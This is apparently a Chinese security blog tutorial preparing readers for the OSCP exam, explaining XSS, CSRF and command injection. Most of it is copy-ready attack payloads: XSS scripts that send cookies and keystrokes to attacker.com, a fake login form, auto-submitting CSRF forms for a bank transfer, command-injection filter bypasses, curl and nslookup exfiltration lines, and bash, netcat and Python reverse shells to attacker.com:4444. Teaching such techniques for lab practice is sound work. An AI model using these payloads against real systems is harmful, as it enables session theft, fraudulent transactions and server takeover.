## 别再说XSS只会弹框了——这三个漏洞，是Web打点的入门三件套  
  
大家好，这里是[泷羽Sec——陌离]。  
  
前十三期我们干的全是"准备工作"——Linux基础、Windows基础、网络原理、核心工具、信息收集、漏洞扫描。这些是地基，地基不牢，后面全是空谈。  
  
最近后台被问得最多的一句话是：**"学长，扫完端口、拿到服务版本之后呢？我盯着一个Web服务，不知道从哪下嘴。"**  
  
这期就来解决这个"断层"。端口扫出来、目录跑出来，下一步就是**找Web漏洞打点**  
。而Web层面最容易上手、OSCP里也最常出现的就是三兄弟：**XSS（跨站脚本）、CSRF（跨站请求伪造）、命令注入（Command Injection）**  
。  
  
我备考早期对XSS的认知，停在<script>alert(1)</script>  
——弹个框而已，能有什么杀伤力？后来在一台靶机上，登录后台后用存储型XSS钓到了管理员的Cookie，直接拿下最高权限，我才明白一个道理：**弹框只是证明漏洞"存在"，窃取会话、劫持操作才是"利用"。**  
 这个认知差，是很多人卡在Web打点上的真正原因。  
  
这期不玩虚的，三件事讲透：**每个漏洞的原理（说人话）→ 手工怎么测、怎么打（可直接抄的payload）→ 从漏洞到拿Shell的完整链路**  
。看完你至少能对着一个Web服务，知道第一步该测什么。

## 二、说人话：三个漏洞到底在攻什么？  
  
先给你一个统一的心智模型，三个漏洞其实分别在攻"三样东西"：  
```
XSS        → 攻「用户的浏览器」      （把代码塞进别人浏览器里执行）
CSRF       → 攻「用户的身份」        （借用户的登录态，冒充他发请求）
命令注入    → 攻「服务器本身」        （把系统命令塞进去，服务器替你执行）

```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Nw0LxfseydXMABwuJoPuvN1CUGD5xNHMxQwII3I2uYp8jic6ibJ1hnpicz2BMrKkngl3dESu3xeIsv29s70HyNdGHbAwzKrhhryUmae5PiargiaU/640?wx_fmt=webp&from=appmsg "")  
- **XSS 打的是人**  
：你控制的是"访问页面的那个用户"的浏览器。  
  
- **CSRF 打的是"信任"**：你骗服务器——让它以为请求是该用户本人发的。  
  
- **命令注入打的是机器**  
：你直接越过应用逻辑，让操作系统执行你的命令。  
  
**记住这条分界线**  
：XSS和CSRF是"从客户端侧下手"，命令注入是"从服务端侧下手"。三个漏洞的利用终点也完全不同——XSS偷凭据、CSRF借身份、命令注入直接拿Shell。  
## 三、XSS：你以为只是弹个框，其实能偷走一切  
### 3.1 原理：代码在"别人的浏览器"里跑  
  
XSS说穿了就一句话：**攻击者把恶意的JavaScript注入到网页里，当其他用户访问这个页面时，这段代码就在他们的浏览器里执行了。**  
  
关键点在于执行位置——代码**不是在攻击者的电脑上跑，而是在受害者的浏览器里跑**  
。这意味着，这段代码能拿到受害者在该网站上的**所有权限**  
：读Cookie、劫持会话、篡改页面、记录键盘、甚至以他的身份发起操作。  
  
举个最经典的例子。一个论坛允许多人发评论，且不对内容做过滤。攻击者在评论里塞了这么一段：  
```
这篇文章写得真好！<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

```  
  
之后**每一个打开这个帖子的人**  
，浏览器都会执行这段脚本，把自己的Cookie悄悄发到攻击者服务器。攻击者拿到Cookie，就能冒充这些人登录论坛。  
  
这就是**存储型XSS**  
——恶意脚本被永久存在服务器上，一次注入，人人中招。

- **反射型**  
：脚本作为请求的一部分发给服务器，服务器"反射"回来显示在页面上。比如搜索<script>alert(1)</script>

弹框说明不了危害。真正的利用场景是这些：  
  
**① 窃取Cookie（最经典）**  
：拿到会话Cookie就能冒充登录。**前提是Cookie没设HttpOnly  
**。  
```
fetch('http://attacker.com/steal?c='+document.cookie)
// 或用图片外带，兼容性更好：
new Image().src='http://attacker.com/steal?c='+encodeURIComponent(document.cookie);

```  
  
**② 键盘记录**  
：在登录页注入键盘记录，偷账号密码。  
```
document.onkeypress = e => fetch('http://attacker.com/log?k='+e.key);

```  
  
**③ 钓鱼（篡改页面）**  
：用JS改掉页面内容，弹一个假登录框，把密码发到自己服务器。  
```
document.body.innerHTML = '<form action="//attacker.com/fake"><input name=u>密码<input type=password name=p><input type=submit></form>';

```  
  
**④ XSS + CSRF 组合（最致命）**  
：脚本运行在目标域下，能直接读到页面上的CSRF Token，然后自动发起一个"带正确Token"的请求——**传统CSRF防护在XSS面前形同虚设**  
。这条后面第四章细讲。

## 四、CSRF：你不小心点了个链接，钱就转走了  
### 4.1 原理：借用你的"已登录身份"  
  
CSRF（Cross-Site Request Forgery，跨站请求伪造）原理极其简单：  
  
**你登录了银行网站A，Cookie还在浏览器里。这时你点开了攻击者发来的链接，打开了恶意网站B。网站B里藏着一个自动提交的表单，向银行A发起了一个转账请求。因为浏览器自动带上了A的Cookie，银行以为是你本人操作，转账就成功了。**  
  
整个流程四步：  
```
① 你登录目标网站（如银行），浏览器存下登录 Cookie
② 你没登出，又打开了恶意网站 B
③ B 里有个自动提交的表单，目标指向银行转账接口
④ 浏览器自动带上银行 Cookie，银行以为是你 → 照办

```  
  
**注意CSRF和XSS的根本区别**  
：  
- XSS 是"我能执行代码"——我需要注入脚本。  
  
- CSRF 是"我能借你的身份发请求"——**我不需要执行任何代码，只需要你点一下（甚至访问一下）**  
。  
  
所以CSRF的门槛更低，但威力取决于那个接口能干什么——转账、改密码、加管理员，接口越敏感，危害越大。  
### 4.2 CSRF攻击示例  
  
**① 最简单的表单自动提交（POST）**  
：  
```
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.example.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
</html>

```  
  
**② 用图片标签发起GET请求（最隐蔽，无需JS）**  
：  
```
<img src="https://bank.example.com/transfer?to=attacker&amount=10000" width=0 height=0>

```  
  
**③ 用 XMLHttpRequest 发POST**  
：  
```
var xhr = new XMLHttpRequest();
xhr.open('POST','https://bank.example.com/transfer',true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
xhr.send('to=attacker&amount=10000');

```

**SameSite 三种取值（务必分清）**  
：  
- SameSite=Strict  
：任何跨站请求都不带Cookie（最严）  
  
- SameSite=Lax  
：允许顶级导航带Cookie，但禁止跨站POST（**现代浏览器默认值**  
）  
  
- SameSite=None  
：不限制，必须配合Secure  
使用  
  
⚠️ **校准提醒**  
：现代浏览器默认Lax  
，让老式CSRF变难了。但**OSCP靶场里的老环境不一定默认开启**  
，而且Lax  
只挡跨站POST，**跨站GET导航仍然带Cookie**  
——所以"用GET发起的敏感操作"依然可打。测CSRF先看：① 请求有没有token？② Cookie有没有SameSite？两个都没有，CSRF基本就成了。  
## 五、命令注入：一个分号，服务器乖乖听你的  
### 5.1 原理：把系统命令"拼"进你的输入  
  
命令注入是三个里最"黑客电影"的一个。原理一句话：**应用在调用系统命令时，把用户输入拼进了命令字符串且没过滤。攻击者利用命令分隔符，在正常命令后面追加自己的命令。**  
  
例子——一个网站的"Ping测试"功能：  
```
system("ping " . $_GET['ip']);

```  
  
你输入8.8.8.8; id  
，后端实际执行的就是ping 8.8.8.8; id  
——先ping，再执行id  
。**关键就在那个分隔符**  
。  
  
**Linux 常见命令分隔符一览**  
：  
```
;     # 顺序执行（最常用）
|     # 管道，把前一个命令输出给后一个
&&    # 前一个成功才执行后一个
||    # 前一个失败才执行后一个
`id`  # 反引号，命令替换
$(id) # 命令替换（更现代）

```  
  
**Windows 常见分隔符**  
：&  
、&&  
、|  
、||  
。  
### 5.2 怎么测：先测回显，再测无回显  
  
**① 基础测试（有回显）**  
：  
```
正常：  http://example.com/ping.php?ip=8.8.8.8
注入：  http://example.com/ping.php?ip=8.8.8.8;id
        http://example.com/ping.php?ip=8.8.8.8|id
        http://example.com/ping.php?ip=8.8.8.8&&id
        http://example.com/ping.php?ip=8.8.8.8||id
        http://example.com/ping.php?ip=8.8.8.8`id`
        http://example.com/ping.php?ip=8.8.8.8$(id)

```  
  
**② 绕过过滤器**  
：  
```
# 用引号绕过空格过滤
'`id`'

# URL 编码（%3B 就是分号）
%3Bid

# 嵌套命令
$(echo $(echo $(echo $(id))))

# 通配符绕过（等同于 /bin/cat /etc/passwd）
/???/??t /???/p??s??

```  
  
**③ 无回显时的时间盲注与带外（OOB）**  
：  
```
# 时间盲注：故意延时，通过响应时间判断命令被执行
ping -c 10 127.0.0.1

# 带外通道：把命令结果外带到你的服务器
curl http://attacker.com/$(id | base64)
# 或用 DNS 外带（目标出不了HTTP但能出DNS时）
nslookup $(whoami).attacker.com

```  
  
⚠️ **校准提醒**  
：无回显是实战里的常态，很多命令注入是"盲"的。除了延时和带外，别忘了**把结果写进Web可访问目录**  
（如id > /var/www/html/o.txt  
）然后直接访问——这招在考试里又快又稳。  
### 5.3 命令注入的利用：从一条命令到Shell  
  
**① 信息收集（拿到执行权后的第一件事）**  
：  
```
id                    # 当前用户与权限
uname -a              # 内核版本（提权要用）
cat /etc/passwd       # 用户列表
ifconfig              # 网络配置（找内网段）
hostname              # 主机名

```  
  
**② 建立反向Shell（Linux，三种常用）**  
：  
```
# Bash 原生反弹
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Netcat 没有 -e 时的管道方案
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f

# Python 反弹（环境有 Python 时最稳）
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

```  
  
**③ 提权侦察（拿到低权Shell之后）**  
：  
```
find / -perm -u=s -type f 2>/dev/null          # 找 SUID 文件
cat /etc/crontab                               # 看定时任务
sudo -l                                        # 看 sudo 权限
find / -name "*.conf" -o -name "*.ini" 2>/dev/null | xargs grep -i "password"   # 配置文件翻密码

```

## 七、避坑指南 🚨  
1. **弹框只是"证明漏洞存在"，不是利用终点**  
——报告里要写清楚XSS的实际危害（窃取会话、劫持操作、组合CSRF），只写"能弹框"是拿不到印象分的。  
  
1. **XSS单独出现概率不高，但它和CSRF是黄金组合**  
——找到XSS后，第一时间想：能不能用它读CSRF Token、劫持会话、或直接以受害者身份发请求。  
  
1. **HttpOnly 会让偷Cookie失效**  
——测试时先看Cookie有没有HttpOnly  
标志。有的话，别在偷Cookie上死磕，改走钓鱼、键盘记录、或直接以受害者身份发请求。  
  
1. **测CSRF先看三件事**  
：① 请求里有没有token参数？② 删掉token或改成随机值，服务器还认吗？③ Cookie有没有SameSite  
？三个都"没防护"，才谈得上能打。  
  
1. **SameSite=Lax 挡不住跨站GET**  
——很多新手以为浏览器默认Lax后CSRF就没了。但Lax只限制跨站POST，**跨站GET导航依然带Cookie**  
，所以用GET发起的敏感操作照样可打。  
  
1. **命令注入：任何"让你输入IP/文件名/路径"的地方都值得测**  
——这是OSCP高频考点，一个分号的事。测的时候;  
、|  
、&&  
、`  
、$()  
 挨个来一遍。  
  
1. **命令注入无回显别放弃**  
——延时盲注（ping -c 10  
）、带外外带（curl  
/nslookup  
）、或直接写进Web目录（id > /var/www/html/o.txt  
）三招轮着上。  
  
1. **拿到shell立刻截图**  
——命令注入拿到的shell窗口、id  
和ifconfig  
的输出、/etc/passwd  
的内容，全部截图。考试报告的证据链就靠这些，别等最后补。
